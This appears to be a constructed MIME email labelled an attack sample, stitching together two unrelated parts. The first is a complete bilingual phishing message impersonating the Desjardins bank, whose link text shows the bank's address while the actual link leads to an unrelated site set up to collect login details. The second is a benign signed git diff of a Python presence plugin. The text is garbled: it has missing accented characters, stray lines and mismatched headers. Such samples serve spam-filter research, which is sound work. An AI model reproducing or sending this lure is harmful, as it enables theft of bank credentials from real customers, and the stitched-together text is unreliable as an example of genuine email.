From: "Patrick Wang" <pwang@berkeley.edu>
To: mary.trosper@enron.com
Subject: MIME Attack Sample
Content-Type: multipart/mixed; boundary="BOUNDARY"
--BOUNDARY
0
Content-Type: text/html
Content-Transfer-Encoding: 8bit
Message-Id: <E1HcQfK-00083l-WE@server.fastbox.info>
Date: Fri, 13 Apr 2007 13:38:34 -0500
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - server.fastbox.info
X-AntiAbuse: Original Domain - speedy.uwaterloo.ca
X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
X-AntiAbuse: Sender Address Domain - server.fastbox.info
X-Source: 
X-Source-Args: 
X-Source-Dir: 
Status: O
Content-Length: 5798
Lines: 104

<html>

<head>
<title>Mouvement Desjardins</title>
<style type="text/css">
<!--
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
}
.style2 {
	font-size: 14px;
	font-weight: bold;
}
.style4 {font-size: 12px}
-->
</style>
</head>
<table width="777" border="0">
  <tr>
    <td width="17"> </td>
    <td width="750"><TABLE width=750 border=1 align="right" cellPadding=0 cellSpacing=0 bordercolor="e1dcd0">
      <TBODY>
        <TR>
          <TD width=750 bgcolor="efede6"><TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
              <TBODY>
                <TR>
                  <TD><IMG 
src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
                </TR>
              </TBODY>
            </TABLE>
              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
                Desjardins/ AccsD</FONT></span><FONT lang=0 face=Estilo size=2 
PTSIZE="10" FAMILY="SANSSERIF"><BR>
                  <BR>
                  </FONT><FONT lang=0 
PTSIZE="10" FAMILY="SANSSERIF"><span class="style1">Desjardins tient  vous signaler que votre dernire transaction n'a pas t automatiquement enregistr d  un nombre elev de transaction simultane. Le dpartement de vrification comptable du Groupe Desjardins  corriger le problme dans les comptes concerns. Si toutefois vous notez une diffrence, nous vous prions de nous en aviser. Si vous constatez une autre erreur, communiquez avec votre institution durant les heures de <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">votre caisse</a>.</span></FONT></SPAN>
              <P align="justify"><span class="Estilo6"><font size=3 face="Estilo, Helvetica, sans-serif" class="style1">Pour accder  
                votre compte et vrifier que tout soit normal, cliquez sur ce lien scuris si dessus :</font></span>
              <P align="justify"><A 
href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
size=4>https://accesd.desjardins.com/</FONT></A>
              <p class=style1>Soyez assur que Desjardins met tout en oeuvre pour protger les utilisateurs de ses services Internet </p>
            <p class=Estilo6><font size=2 face="Arial, Helvetica, sans-serif" class="style1">Le Groupe 
              Desjardins vous remercie de votre clientle et apprcie votre comprhension.</font></p>
            <p class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
size=2>Desjardins / AccsD</FONT></STRONG><BR>
                  <FONT size=2>Conjuguer avoirs et 
                    tres 
                </FONT></p>
            <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
                <TBODY>
                  <TR>
                    <TD><IMG 
src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
                  </TR>
                </TBODY>
              </TABLE>
            <p><span class="style2"><FONT color=#009966>Dear Desjardins Member</FONT></span></p>
            <P align="justify" class="style1">The Group Desjardins would like to inform you that your last transaction was not automatically recorded due to a high number of simultaneous transactions. Desjardins audit department corrected the problem in the accounts concerned. However if you notice a difference in your folio, we ask you to advise us by communicating with your institution during <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">opening hours</a>
              <P align="justify"><span class="style1">We encourage you to    connect to your account and verify your transactions, by clicking the secured url below :<br>
                    <BR>
                </span><span class="style4"><A 
href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
size=4>https://accesd.desjardins.com/</FONT></A></span><span class="style1"> </span>
              <P class=style1>Be assured that Desjardins makes every effort to protect our internet users </P>
            <P class=style1>The Group Desjardins  thanks you for your business and appreciates your comprehension</P>
            <P class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
size=2><br>
              Desjardins / AccsD</FONT></STRONG><BR>
              <FONT size=2>Money working for people </FONT></P>
            <P><FONT face="Estilo, Helvetica,
sans-serif" size=2><FONT color=#999999 
size=1>Svp ne rpondez pas  ce courriel car c'est seulement un avis. Le courrier envoy  cette adresse ne peut pas tre rpondu. 
              </FONT></FONT></P>
            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
                <TBODY>
                  <TR>
                    <TD width=5></TD>
                    <TD class="footerText Estilo2" vAlign=bottom align=left><P class=style1>Copyright  2006 Mouvement des caisses Desjardins. Tous droits 
                      rservs.</P></TD>
                    <TD align=right><P><SPAN class=bodyText></FONT></SPAN> </P></TD>
                  </TR>
                  <TR>
                    <TD width=5></TD>
                    <TD class=Estilo5 colSpan=2></TD>
                  </TR>
                </TBODY>
            </TABLE>
            <P><FONT face="Estilo, Helvetica,
sans-serif" size=2><FONT color=#999999 
size=1></FONT></FONT><img src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif" border="0" width="140" height="39"></P></TD>
        </TR>
      </TBODY>
    </TABLE></td>
  </tr>
</table>
</P>
</body>

</html>



.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
Content-Type: text/plain

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- ---
 services/presence/server_plugin.py |   56 +++++++++++++++++++++++++++---------
 1 files changed, 42 insertions(+), 14 deletions(-)

diff --git a/services/presence/server_plugin.py b/services/presence/server_plugin.py
index 49280e3..2871df8 100644
- --- a/services/presence/server_plugin.py
+++ b/services/presence/server_plugin.py
@@ -905,24 +905,52 @@ class ServerPlugin(gobject.GObject):
         _logger.debug("Handle %s: current activity now %s" % (handle, activity))
         self._buddy_properties_changed_cb(handle, prop)
 
- -    def _new_channel_cb(self, object_path, channel_type, handle_type, handle, suppress_handler):
+    def _new_channel_cb(self, object_path, channel_type, handle_type, handle,
+                        suppress_handler):
         """Handle creation of a new channel
         """
- -        if handle_type == CONNECTION_HANDLE_TYPE_ROOM and channel_type == CHANNEL_TYPE_TEXT:
- -            channel = Channel(self._conn._dbus_object._named_service, object_path)
+        if (handle_type == CONNECTION_HANDLE_TYPE_ROOM and
+            channel_type == CHANNEL_TYPE_TEXT):
+            def ready(channel):
 
- -            # hack
- -            channel._valid_interfaces.add(CHANNEL_INTERFACE_GROUP)
- -
- -            current, local_pending, remote_pending = channel[CHANNEL_INTERFACE_GROUP].GetAllMembers()
- -            
- -            if local_pending:
- -                for act_id, act_handle in self._activities.items():
+                for act_id, act_handle in self._activities.iteritems():
                     if handle == act_handle:
- -                        self.emit("activity-invitation", act_id)
- -
- -        elif handle_type == CONNECTION_HANDLE_TYPE_CONTACT and \
- -            channel_type in [CHANNEL_TYPE_TEXT, CHANNEL_TYPE_STREAMED_MEDIA]:
+                        break
+                    else:
+                        return
+
+                def members_changed(message, added, removed, local_pending,
+                                    remote_pending, actor, reason):
+                    # FIXME: if contacts were added, who don't have this
+                    # activity in their PEP node for whatever reason, then
+                    # emit buddy-activities-changed for them (otherwise they
+                    # could be in an activity while pretending they weren't,
+                    # which would be crazy)
+                    pass
+
+                def got_all_members(current, local_pending, remote_pending):
+                    if local_pending:
+                        for act_id, act_handle in self._activities.iteritems():
+                            if handle == act_handle:
+                                self.emit('activity-invitation', act_id)
+                def got_all_members_err(e):
+                    logger.debug('Unable to get channel members for %s:',
+                                 object_path, exc_info=1)
+
+                # hook the MembersChanged signal so we get told when people
+                # join/leave
+                group = channel[CHANNEL_INTERFACE_GROUP]
+                group.connect_to_signal('MembersChanged', members_changed)
+                group.GetAllMembers(reply_handler=got_all_members,
+                                    error_handler=got_all_members_err)
+
+            # we throw away the channel as soon as ready() finishes
+            Channel(self._conn.service_name, object_path,
+                    ready_handler=ready)
+
+        elif (handle_type == CONNECTION_HANDLE_TYPE_CONTACT and
+              channel_type in (CHANNEL_TYPE_TEXT,
+                               CHANNEL_TYPE_STREAMED_MEDIA)):
             self.emit("private-invitation", object_path)
 
     def update_activity_properties(self, act_id):
- -- 
1.5.2-rc3.GIT

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net

iD8DBQFGVXq3WSc8zVUw7HYRAuSGAKC2exySPjDM1VQ+3g6/2LIsvCrPigCgvGWs
nCJ3O+BD29et0Rb5vaiMRko=
=kx/X
-----END PGP SIGNATURE-----
-BOUNDARY--
